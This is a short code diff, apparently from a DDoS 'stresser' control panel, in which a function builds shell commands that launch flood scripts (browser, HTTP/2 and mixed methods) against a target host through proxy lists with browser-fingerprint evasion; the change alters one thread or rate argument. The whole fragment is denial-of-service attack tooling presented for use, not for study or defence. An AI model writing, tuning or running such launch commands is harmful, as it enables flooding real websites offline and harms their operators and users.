@@ -46,7 +46,7 @@ const generateCommand = (method, host, port, time) => {
         case 'BROWSER':
             return `cd /root/methods && screen -dm node browsern.js ${host} ${time} 8 --fingerprint basic --proxy proxy.txt`;
         case 'H2NEYLI':
-            return `cd /root/methods && node H2-NEYLI.js ${host} ${time} 32 8 proxy.txt`;
+            return `cd /root/methods && node H2-NEYLI.js ${host} ${time} 32 5 proxy.txt`;
         case 'MIXBIL':
             return `cd /root/methods && node MIXBIL.js ${host} ${time} 32 4 proxy.txt`;
         case 'RAW':
